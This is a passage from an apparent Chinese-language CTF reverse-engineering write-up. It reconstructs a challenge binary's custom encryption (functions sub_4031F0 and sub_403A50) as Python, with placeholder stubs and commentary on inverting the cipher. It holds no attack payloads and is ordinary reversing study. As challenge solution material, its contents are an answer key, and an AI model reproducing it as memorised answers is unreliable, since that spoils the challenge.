</span></span><span class="line"><span class="cl">                      <span class="n">b8</span><span class="p">,</span> <span class="n">b9</span><span class="p">,</span> <span class="n">b10</span><span class="p">,</span> <span class="n">b11</span><span class="p">,</span> <span class="n">b12</span><span class="p">,</span> <span class="n">b13</span><span class="p">,</span> <span class="n">b14</span><span class="p">,</span> <span class="n">b15</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># store into a2[4] (offset 4*16 = 64)</span>
</span></span><span class="line"><span class="cl">    <span class="n">a2</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="mi">16</span> <span class="p">:</span> <span class="mi">4</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">v9_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Example usage:</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xDEADBEEF</span><span class="p">,</span> <span class="mh">0xCAFEBABE</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">a2_bytes</span> <span class="o">=</span> <span class="n">compute_a2_from_a1</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;a2 (hex):&#34;</span><span class="p">,</span> <span class="n">a2_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># If you want to view each 16-byte lane like __m128i elements:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">a2_bytes</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;a2[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">] = </span><span class="si">{</span><span class="n">chunk</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>接着就是最后加密的地方sub_4031F0</p>
<p><img src="/img/2025-QWB-S9/47.png" alt="img"></p>
<p>里面还是比较复杂的，第一眼以为没法逆向来着，观察到最后先乘以7再加13再异或0x53，ai分析可知7有逆元0xb7可逆，所以得开始想办法解密上面的aes明文</p>
<p><img src="/img/2025-QWB-S9/48.png" alt="img"></p>
<p>发现sub_403A50和sub_4031F0紧邻，里面正是逆向代码，还没被调用，出题人可能忘删了也可能故意留着。想着调试会更简单，但是不会发通信数据。所以直接疯狂拷打ai让他同构sub_403A50。其中a1是密文、a3是密钥、a2是a1长度、a4是0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1"># --- 辅助函数 (模拟 C 的 8 位循环移位) ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ROR1</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="n">bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;8位循环右移&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="n">bits</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">bits</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ROL1</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="n">bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;8位循环左移&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">byte</span> <span class="o">&lt;&lt;</span> <span class="n">bits</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">bits</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- 占位符函数 ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_4031F0_placeholder</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">,</span> <span class="n">a2_len</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    这是对 C 函数 sub_4031F0 的占位符。
</span></span></span><span class="line"><span class="cl"><span class="s2">    如果 a4 != 0，则会调用此函数。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] 调用 sub_4031F0 (未实现)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 在此处实现 sub_4031F0 的逻辑</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sim_simd_block</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">,</span> <span class="n">start_index</span><span class="p">,</span> <span class="n">end_index</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    这是对 C 代码中 SSE/SIMD 块 (v18-v39) 的占位符。
</span></span></span><span class="line"><span class="cl"><span class="s2">    这部分代码在 C 中用于高性能处理 128 字节的数据块。
</span></span></span><span class="line"><span class="cl"><span class="s2">    要 1:1 翻译它，需要逆向工程其实现的具体加密算法。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] 调用 SIMD 块 (未实现) @ </span><span class="si">{</span><span class="n">start_index</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="n">end_index</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 在此处实现 SIMD 块的 *算法* 逻辑</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- 核心逻辑的 Python 实现 ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scalar_8byte_block_transform</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">,</span> <span class="n">start_index</span><span class="p">,</span> <span class="n">end_index</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    实现了 C 代码中的 v40 和 v46 循环（标量 8 字节块转换）。
</span></span></span><span class="line"><span class="cl"><span class="s2">    它在 8 字节块上对索引 i 和 i+4 的字节进行 3 轮混淆。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 从 a3 获取密钥</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_b</span> <span class="o">=</span> <span class="n">a3_buf</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span>  <span class="c1"># a3 + 34</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_c</span> <span class="o">=</span> <span class="n">a3_buf</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span>  <span class="c1"># a3 + 33</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_d</span> <span class="o">=</span> <span class="n">a3_buf</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span>  <span class="c1"># a3 + 32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># C 循环是 v6 &lt; v15 (a2-7)，v6 每次+8</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 这等同于处理 0, 8, 16... 直到 (a2-8) &amp; ~7</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start_index</span><span class="p">,</span> <span class="n">end_index</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 对应 v41 = *v40</span>
</span></span><span class="line"><span class="cl">        <span class="n">v41_b</span> <span class="o">=</span> <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 第 1 轮 ---</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># v42 = *(v40 - 4) ^ ROL1(key_b + 3*v41, 1)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 4) 对应 a1[i+4]</span>
</span></span><span class="line"><span class="cl">        <span class="n">v42_b</span> <span class="o">=</span> <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">^</span> <span class="n">ROL1</span><span class="p">((</span><span class="n">key_b</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">v41_b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 4) = v41</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">v41_b</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 8) = v42</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v42_b</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 第 2 轮 ---</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># v44 = v41 ^ ROL1(key_c + 3*v42, 1)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v44_b</span> <span class="o">=</span> <span class="n">v41_b</span> <span class="o">^</span> <span class="n">ROL1</span><span class="p">((</span><span class="n">key_c</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">v42_b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 4) = v42</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">v42_b</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 8) = v44</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v44_b</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 第 3 轮 ---</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># v45 = ROL1(key_d + 3*v44, 1)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v45_b</span> <span class="o">=</span> <span class="n">ROL1</span><span class="p">((</span><span class="n">key_d</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">v44_b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 4) = v44</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">v44_b</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># *(v40 - 8) = v45 ^ v42</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v45_b</span> <span class="o">^</span> <span class="n">v42_b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_403A50_py</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">:</span> <span class="nb">bytearray</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">a4</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    C 函数 sub_403A50 的 Python 简化版。
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    :param a1_buf: 必须是 bytearray (可变缓冲区)
</span></span></span><span class="line"><span class="cl"><span class="s2">    :param a3_buf: 必须是 bytes 或 bytearray (密钥/上下文)
</span></span></span><span class="line"><span class="cl"><span class="s2">    :param a4: 标志位
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">a2_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- 1. `if (a4)` 分支 ---</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sub_4031F0_placeholder</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">,</span> <span class="n">a2_len</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>  <span class="c1"># 函数结束</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- 2. `else (a4 == 0)` 分支 ---</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a2_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 阶段 1：反向预处理循环 (v7, v9) ---</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># C 代码的循环从 a2-1 向下遍历到 0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a2_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">v9</span> <span class="o">=</span> <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">ror_val</span> <span class="o">=</span> <span class="n">ROR1</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">xor_val</span> <span class="o">=</span> <span class="n">ror_val</span> <span class="o">^</span> <span class="mh">0x5A</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># (val - 13) * -73，最后截断为 8-bit</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Python 的 &amp; 0xFF 模拟了 C 的 (char) 截断</span>
</span></span><span class="line"><span class="cl">            <span class="n">sub_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_val</span> <span class="o">-</span> <span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">sub_val</span> <span class="o">*</span> <span class="o">-</span><span class="mi">73</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">            <span class="n">a1_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">mul_val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 阶段 2：核心转换循环 ---</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">a2_len</span> <span class="o">&gt;</span> <span class="mi">7</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># C 代码中，此循环处理 8 字节块，直到索引 &lt; (a2 - 7)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 最后一个块的起始索引是 (a2 - 8) &amp; ~7</span>
</span></span><span class="line"><span class="cl">            <span class="n">scalar_loop_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">a2_len</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># C 代码中的 SIMD 检查</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 我们只模拟 a2 &gt; 135 的条件</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">a2_len</span> <span class="o">&gt;</span> <span class="mi">135</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># --- 情况 A：SIMD ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># 计算 SIMD 会处理多少 128 字节的块</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># (a2 - 8) &gt;&gt; 7 是 C 代码中的 simd_block_count</span>
</span></span><span class="line"><span class="cl">                <span class="n">simd_end_index</span> <span class="o">=</span> <span class="p">((</span><span class="n">a2_len</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">*</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">simd_end_index</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># 调用 SIMD 占位符</span>
</span></span><span class="line"><span class="cl">                    <span class="n">sim_simd_block</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">simd_end_index</span><span class="p">,</span> <span class="n">a3_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># C 代码的 v40 循环，处理 SIMD 之后的剩余部分</span>
</span></span><span class="line"><span class="cl">                <span class="n">scalar_start_index</span> <span class="o">=</span> <span class="n">simd_end_index</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># --- 情况 B：非 SIMD ---</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># C 代码的 v46 循环，从头开始处理</span>
</span></span><span class="line"><span class="cl">                <span class="n">scalar_start_index</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># 为情况 A（剩余部分）或情况 B（全部）运行标量循环</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">scalar_start_index</span> <span class="o">&lt;</span> <span class="n">scalar_loop_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">scalar_8byte_block_transform</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="n">a1_buf</span><span class="p">,</span> <span class="n">scalar_start_index</span><span class="p">,</span> <span class="n">scalar_loop_end</span><span class="p">,</span> <span class="n">a3_buf</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 阶段 3：正向后处理循环 (v12) ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># v10 = *(_DWORD *)(a3 + 88)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a3_buf</span><span class="p">[</span><span class="mi">88</span><span class="p">:</span><span class="mi">92</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># v11 = a3 + 64</span>
</span></span><span class="line"><span class="cl">        <span class="n">v11_base_ptr</span> <span class="o">=</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">v12</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a2_len</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># v13 = ROR1(a1[v12], 2)</span>
</span></span><span class="line"><span class="cl">            <span class="n">v13</span> <span class="o">=</span> <span class="n">ROR1</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">[</span><span class="n">v12</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># v14 = a3[64 + (v12 &amp; 0xF)] ^ v13</span>
</span></span><span class="line"><span class="cl">            <span class="n">key1</span> <span class="o">=</span> <span class="n">a3_buf</span><span class="p">[</span><span class="n">v11_base_ptr</span> <span class="o">+</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">            <span class="n">v14</span> <span class="o">=</span> <span class="n">key1</span> <span class="o">^</span> <span class="n">v13</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># key2_index = ((v10_low_byte + v12_low_byte) &amp; 0x1F)</span>
</span></span><span class="line"><span class="cl">            <span class="n">key2_index</span> <span class="o">=</span> <span class="p">((</span><span class="n">v10</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x1F</span>
</span></span><span class="line"><span class="cl">            <span class="n">key2</span> <span class="o">=</span> <span class="n">a3_buf</span><span class="p">[</span><span class="n">key2_index</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># a1[v12] = v14 - key2 - v12</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 所有运算都隐式截断为 8 位</span>
